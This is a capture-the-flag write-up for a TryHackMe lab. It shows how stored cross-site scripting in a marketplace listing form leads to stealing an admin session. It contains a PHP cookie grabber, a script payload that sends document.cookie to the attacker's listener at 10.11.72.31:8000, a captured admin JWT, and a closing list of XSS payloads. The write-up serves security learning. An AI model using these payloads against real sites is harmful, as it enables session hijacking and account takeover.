<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS Cross Site Scripting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XSS Cross Site Scripting</h1><br/><p>Source ----â†’ THM: The Marketplace</p><p></p><p><strong><h3>XSS Vulnerability Exploit</h3></strong></p><p>I tried various enumerations and found that the website is vulnerable to <strong>XSS</strong> (<strong>Cross Site Scripting</strong>) in the item listing field.</p><p>We will use this vulnerability to get the admin cookie and login as admin.</p><p></p><p><strong>Following are the steps:</strong> </p><p></p><p>1. Create a user with some password in the <strong>Sign up</strong></p><p>	<strong>Site User</strong></p><p>	Username: <strong>Bob</strong></p><p>	Password: <strong>12345</strong>	</p><p>	</p><p>2. Go to <strong>Login</strong> and login to the site using the above user.</p><p>	</p><p>	<img src="images/207-1.png" alt="images/207-1.png" /></p><p></p><p>3. The <strong>XSS vulnerability</strong> lies in the <strong>New listing</strong> form. I open it and add simple javascript alert code. </p><p>	</p><p>	<strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong></p><p>	<img src="images/207-2.png" alt="images/207-2.png" /></p><p>	</p><p>4. Once I hit submit. The item is added and i get my script alert, indicating the XSS vulnerability.</p><p>   <img src="images/207-3.png" alt="images/207-3.png" /></p><p></p><p>	<strong>Note:</strong> The item is now added into our existing items in the home page and we can also activate the script by opening it from there.</p><p>	If we click on xss_test_1, we will get the above page again.</p><p>	<img src="images/207-4.png" alt="images/207-4.png" /></p><p></p><p></p><p>	<strong>Hint:</strong> <strong>If you think a listing is breaking the rules, you can report it!</strong></p><p> </p><p>	<strong>Findings</strong>:</p><p></p><p>	When i open any item there is a link to <strong>report</strong> it to <strong>admin</strong>. If you <strong>report</strong> any item, it will give us 2 messages.</p><p>	<img src="images/207-5.png" alt="images/207-5.png" /></p><p>	Then Click on <strong>report</strong></p><p>	<img src="images/207-6.png" alt="images/207-6.png" /></p><p>	<strong>Message: 1 </strong></p><p>	It comes instantly stating our request has been<strong> sent to admin </strong>for <strong>evaluation</strong>.</p><p>	<img src="images/207-7.png" alt="images/207-7.png" /></p><p>	<strong>Message: 2</strong></p><p>	After opening the <strong>Messages</strong> tab we find the admin&#39;s reply.</p><p>	<img src="images/207-8.png" alt="images/207-8.png" /></p><p>	</p><p>	Now, lets try to report our Javascript enabled item.</p><p>	I <strong>reported</strong> the <strong>xss_test_1</strong> item and got <strong>2 messages</strong> again.</p><p>	This time the <strong>admin</strong>&#39;s reply was intresting.</p><p>	</p><p>	<img src="images/207-9.png" alt="images/207-9.png" /></p><p>	</p><p>	The reply confirms that javascript is working in the admin area. However, alerts are blocked.</p><p>	</p><p>	</p><p>	</p><p>5. No worries, we won&#39;t need <strong>alert</strong> anyway.</p><p>	</p><p>	<strong>Note:</strong> Following code will work on php based web servers</p><p>	</p><p>	<strong>PHP Cookie Grabber</strong></p><p><strong>	&lt;?php</strong></p><p><strong>	</strong></p><p><strong>	$cookie = $_GET[&#39;c&#39;];</strong></p><p><strong>	$fp = fopen(&#39;cookies.txt&#39;, &#39;a+&#39;);</strong></p><p><strong>	fwrite($fp, &#39;Cookie:&#39; .$cookie.&quot;\r\n&quot;);</strong></p><p><strong>	fclose($fp);</strong></p><p><strong>	</strong></p><p><strong>	?&gt;</strong></p><p>	</p><p>	I created a <strong>grabber.php</strong> file &amp; started the <strong>netcat listener</strong> on port <strong>8000</strong> or <strong>python http server </strong>on port <strong>8000</strong></p><p>	</p><p><strong>	Note: </strong>As we are not using a php webserver, no output will be written in our server. We will just capture the initial request in netcat or python web server terminal logs	</p><p>	Therefore, any made up name can be used, it will still work. 	Eg. <strong>http://10.11.72.31:8000/rockstar.php?z=</strong></p><p>	</p><p>	</p><p>	Then create a new item (Say<strong> xss_test_2</strong>), with the following javascript code in the description.</p><p>	<strong>&lt;script&gt;document.location=&#39;http://10.11.72.31:8000/grabber.php?c=&#39;+document.cookie&lt;/script&gt;</strong></p><p>	<img src="images/207-10.png" alt="images/207-10.png" /></p><p>6. Now <strong>report</strong> the <strong>xss_test_2</strong> item to the admin and the admin will open the item for evaluation, we should get the admin cookie in our <strong>netcat listener or python http server</strong></p><p>	</p><p>	When i tried to open the xss_test_2 it won&#39;t open at it is getting redirected to a local page which doesn&#39;t exit. Netcat however, catches user Bob&#39;s cookie as expected.</p><p>	</p><p>	<img src="images/207-11.png" alt="images/207-11.png" /></p><p>	</p><p>	Netcat Response</p><p>	<img src="images/207-12.png" alt="images/207-12.png" /></p><p>	</p><p>	</p><p>	But we need to report it for the admin to open and we get the admin cookie. So i llok back to the previous report&#39;s URL.</p><p>	<strong>http://10.10.187.53/report/1</strong> for first item and <strong>http://10.10.187.53/report/3</strong> for the xss_test_1</p><p>	</p><p>	So lets use <strong>http://10.10.187.53/report/4</strong> to report the xss_test_2</p><p>	</p><p>	<img src="images/207-13.png" alt="images/207-13.png" /></p><p>	</p><p>	We click on <strong>Report</strong> and check our netcat listner</p><p>	</p><p>	<img src="images/207-14.png" alt="images/207-14.png" /></p><p>	</p><p>	We got the admin cookie.</p><p>	<strong>Admin Cookie:</strong> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5ODczMDB9.3gpiMWBVHvUPovTYt_fJRbR4W_NpDSnmzK-x-gOl7_8</p><p>	</p><p>7. Open the <strong>/admin</strong> link and replace the cookie with the above found cookie using <strong>burpsuite</strong> or <strong>cookie editor</strong>.</p><p></p><p>	<img src="images/207-15.png" alt="images/207-15.png" /></p><p>	</p><p>	We successfully logged in as <strong>Administrator</strong> &amp; got the first flag.</p><p>	</p><p>	</p><p><strong><h2>Some XSS Payloads</h2></strong></p><p></p><p>HTML Injection</p><p>&lt;h1&gt;Hello&lt;/h1&gt;</p><p></p><p>Javascript Injection</p><p>&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</p><p>&lt;script&gt;alert(document.cookies)&lt;/script&gt;</p><p>&lt;script&gt;document.querySelector(&#39;#thm-title&#39;).textContent = &#39;I am a hacker&#39;&lt;/script&gt;</p><p></p><p>Iframe Injection</p><p>&lt;iframe src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</p></div>
</body>
</html>
